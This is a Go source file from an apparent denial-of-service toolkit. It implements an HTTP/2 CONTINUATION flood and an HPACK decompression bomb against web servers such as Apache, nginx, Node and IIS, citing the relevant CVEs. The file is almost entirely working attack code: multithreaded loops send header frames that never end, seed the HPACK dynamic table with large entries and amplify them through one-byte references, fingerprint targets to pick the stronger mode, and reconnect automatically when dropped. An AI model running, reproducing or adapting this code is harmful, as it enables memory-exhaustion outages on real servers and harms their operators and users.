package attack

import (
	"bytes"
	"log"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

// ============================================================
// HTTP/2 CONTINUATION Flood + HPACK Bomb（版本门控）
//
// CONTINUATION Flood（CVE-2024-27316 Apache / CVE-2024-27983 Node /
// CVE-2023-45288 Go x/net）：
//   发一个不带 END_HEADERS 的 HEADERS，然后无限 CONTINUATION 帧，
//   服务器必须把整个 header block 累积在内存直到收到 END_HEADERS
//   或超限——对未修复目标直接内存耗尽；对修复目标（边解压边检查
//   maxHeaderListSize）仍有帧处理/解压开销。
//
// HPACK Bomb（CVE-2026-49975 httpd / CVE-2026-47774 nginx）：
//   先向 HPACK 动态表插入 ~4KB 条目，然后用 1 字节索引引用反复
//   放大——每帧 16KB 线上 ≈ 16375 个引用 × 4KB = 65MB 解压输出。
//   对 IIS（内核态无解压检查）与未修复版本直接内存爆炸。
//   http2_bomb 方法自动门控：指纹判定 BombVuln 时全力 bomb，
//   否则降级为 CONTINUATION flood 并日志提示。
// ============================================================

const (
	// maxContinuationPayload 默认 SETTINGS_MAX_FRAME_SIZE(16384) - 9B 帧头
	maxContinuationPayload = 16375
	// bombEntrySize HPACK 动态表条目值大小：默认 HEADER_TABLE_SIZE=4096，
	// 必须略小于表大小才不会被 evict（引用才有效）
	bombEntrySize = 4000
)

// writeContinuationHeader 打开一个流的 header block（HEADERS 不带 END_HEADERS）。
// firstBlock 为预编码的 hpack 块（普通填充或 bomb 大条目）。
func (c *h2ResetConn) writeContinuationHeader(scheme, authority, path string, firstBlock []byte) error {
	c.hpackBuf.Reset()
	c.hpackEnc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	c.hpackEnc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
	c.hpackEnc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	c.hpackEnc.WriteField(hpack.HeaderField{Name: ":authority", Value: authority})
	if len(firstBlock) > 0 {
		c.hpackBuf.Write(firstBlock)
	}
	if err := c.framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      c.streamID,
		BlockFragment: c.hpackBuf.Bytes(),
		EndStream:     true,  // 请求方向结束（无 body）
		EndHeaders:    false, // 关键：header block 未结束，必须跟 CONTINUATION
	}); err != nil {
		return err
	}
	return nil
}

// writeContinuation 发送一帧 CONTINUATION（payload 为预编码的 hpack 块）
func (c *h2ResetConn) writeContinuation(block []byte) error {
	return c.framer.WriteContinuation(c.streamID, false, block)
}

// buildPlainBlock 普通模式填充：合法小 field 重复（帧处理 + 解压压力，无放大）
func buildPlainBlock(enc *hpack.Encoder, buf *bytes.Buffer) []byte {
	buf.Reset()
	for buf.Len() < maxContinuationPayload {
		enc.WriteField(hpack.HeaderField{Name: "x-cf", Value: "y"})
	}
	return buf.Bytes()
}

// buildBombSeedBlock 炸弹模式首个块：向 HPACK 动态表插入 ~4KB 大条目
// （客户端与服务器 hpack 状态同步，之后引用有效）
func buildBombSeedBlock(enc *hpack.Encoder, buf *bytes.Buffer) []byte {
	buf.Reset()
	enc.WriteField(hpack.HeaderField{Name: "x-bomb", Value: strings.Repeat("A", bombEntrySize)})
	return buf.Bytes()
}

// buildBombRefBlock 炸弹模式填充帧：1 字节索引引用 × 16375 ≈ 65MB 解压输出/帧。
// HPACK indexed field 编码：7-bit prefix，索引 62 (<128) 单字节 0x80|62 = 0xBE。
func buildBombRefBlock(enc *hpack.Encoder, buf *bytes.Buffer) []byte {
	buf.Reset()
	ref := byte(0x80 | 62) // indexed header field, dynamic table entry 62
	for buf.Len() < maxContinuationPayload {
		buf.WriteByte(ref)
	}
	return buf.Bytes()
}

// startH2ContinuationLoop 共享攻击循环。
// bombMode: true=HPACK 放大填充；false=普通合法填充。
func startH2ContinuationLoop(s *AttackSession, cfg AttackConfig, addr, scheme, authority string, useTLS, bombMode bool) {
	go func() {
		var wg sync.WaitGroup
		dur := time.Duration(cfg.Duration) * time.Second

		for i := 0; i < cfg.Threads; i++ {
			wg.Add(1)
			go func(seed int64) {
				defer wg.Done()
				endTime := time.Now().Add(dur)
				tc := newTimeCache()
				path := "/"

				conn, framer, err := dialH2(addr, useTLS, 5*time.Second)
				if err != nil {
					log.Printf("[h2_continuation] dial %s failed: %v", addr, err)
					atomic.AddUint64(&s.Stats.Errors, 1)
					return
				}
				rc := &h2ResetConn{conn: conn, framer: framer, streamID: 1}
				rc.hpackEnc = hpack.NewEncoder(&rc.hpackBuf)

				// 预编码各填充块（每连接一次，避免热路径反复编码）
				plainBlock := buildPlainBlock(rc.hpackEnc, &rc.hpackBuf)
				bombSeedBlock := buildBombSeedBlock(rc.hpackEnc, &rc.hpackBuf)
				bombRefBlock := buildBombRefBlock(rc.hpackEnc, &rc.hpackBuf)

				// 打开流的首个 header 块（HEADERS 帧）：bomb 模式携带大条目
				firstBlock := plainBlock
				if bombMode {
					firstBlock = bombSeedBlock
				}

				for tc.since(endTime) < 0 {
					select {
					case <-s.StopChan:
						return
					default:
					}

					if !s.checkRate(maxContinuationPayload) {
						time.Sleep(time.Microsecond * 100)
						continue
					}

					// 打开新流（上一个流被服务器掐断或我们结束）
					if err := rc.writeContinuationHeader(scheme, authority, path, firstBlock); err != nil {
						conn.Close()
						conn, framer, err = dialH2(addr, useTLS, 5*time.Second)
						if err != nil {
							atomic.AddUint64(&s.Stats.Errors, 1)
							return
						}
						rc = &h2ResetConn{conn: conn, framer: framer, streamID: 1}
						rc.hpackEnc = hpack.NewEncoder(&rc.hpackBuf)
						atomic.AddUint64(&s.Stats.Errors, 1)
						continue
					}
					atomic.AddUint64(&s.Stats.PacketsSent, 1)
					atomic.AddUint64(&s.Stats.BytesSent, uint64(len(firstBlock)+50))

					// 无限 CONTINUATION（永不 END_HEADERS；服务器断流后重连）
					for tc.since(endTime) < 0 {
						select {
						case <-s.StopChan:
							return
						default:
						}

						block := plainBlock
						if bombMode {
							block = bombRefBlock
						}

						if !s.checkRate(maxContinuationPayload) {
							time.Sleep(time.Microsecond * 100)
							continue
						}

						if err := rc.writeContinuation(block); err != nil {
							// 连接被服务器掐断（超限/GOAWAY）：重连开新流
							conn.Close()
							conn, framer, err = dialH2(addr, useTLS, 5*time.Second)
							if err != nil {
								atomic.AddUint64(&s.Stats.Errors, 1)
								return
							}
							rc = &h2ResetConn{conn: conn, framer: framer, streamID: 1}
							rc.hpackEnc = hpack.NewEncoder(&rc.hpackBuf)
							atomic.AddUint64(&s.Stats.Errors, 1)
							break
						}
						atomic.AddUint64(&s.Stats.PacketsSent, 1)
						atomic.AddUint64(&s.Stats.BytesSent, uint64(len(block)))
						tc.refresh()
					}
				}
				conn.Close()
			}(int64(i))
		}

		select {
		case <-time.After(dur):
		case <-s.StopChan:
		}
		s.finish()
		waitGroupTimeout(&wg, 5*time.Second)
		close(s.DoneChan)
	}()
}

// StartHTTP2ContinuationEx CONTINUATION Flood（内存累积型，与 Rapid Reset 互补）
func StartHTTP2ContinuationEx(cfg AttackConfig) *AttackSession {
	s := NewAttackSession(cfg.Target, cfg.Targets, "http2_continuation", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 10
	}

	targets := resolveTargetStrings(cfg)
	if len(targets) == 0 {
		s.abort()
		return s
	}
	t0 := targets[0]
	if !strings.HasPrefix(t0, "http") {
		t0 = "http://" + t0
	}
	go func() {
		logFingerprint(FingerprintL7Target(t0, 4*time.Second))
	}()

	useTLS := strings.HasPrefix(t0, "https")
	scheme := "http"
	if useTLS {
		scheme = "https"
	}
	startH2ContinuationLoop(s, cfg, hostPort(t0), scheme, hostOnly(t0), useTLS, false)
	return s
}

// StartHTTP2BombEx HPACK Bomb（版本门控）：
// 指纹判定 BombVuln（IIS / 未修复版本）→ 全力 HPACK 放大；
// 否则降级为 CONTINUATION Flood 并日志提示（对修复版白打无意义）。
func StartHTTP2BombEx(cfg AttackConfig) *AttackSession {
	s := NewAttackSession(cfg.Target, cfg.Targets, "http2_bomb", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 10
	}

	targets := resolveTargetStrings(cfg)
	if len(targets) == 0 {
		s.abort()
		return s
	}
	t0 := targets[0]
	if !strings.HasPrefix(t0, "http") {
		t0 = "http://" + t0
	}

	// 版本门控：指纹探测决定 bomb 是否有效
	bombOK := false
	fp := FingerprintL7Target(t0, 5*time.Second)
	logFingerprint(fp)
	if fp != nil && fp.BombVuln && (fp.HTTP2 || fp.HTTP2C) {
		bombOK = true
		log.Printf("[http2_bomb] target %s confirmed HPACK Bomb vulnerable (%s %s) — full bomb mode", t0, fp.Product, fp.Version)
	} else if fp != nil {
		log.Printf("[http2_bomb] target %s not Bomb-vulnerable (IIS/pre-2024 only) — degraded to CONTINUATION Flood", t0)
	}

	useTLS := strings.HasPrefix(t0, "https")
	scheme := "http"
	if useTLS {
		scheme = "https"
	}
	startH2ContinuationLoop(s, cfg, hostPort(t0), scheme, hostOnly(t0), useTLS, bombOK)
	return s
}
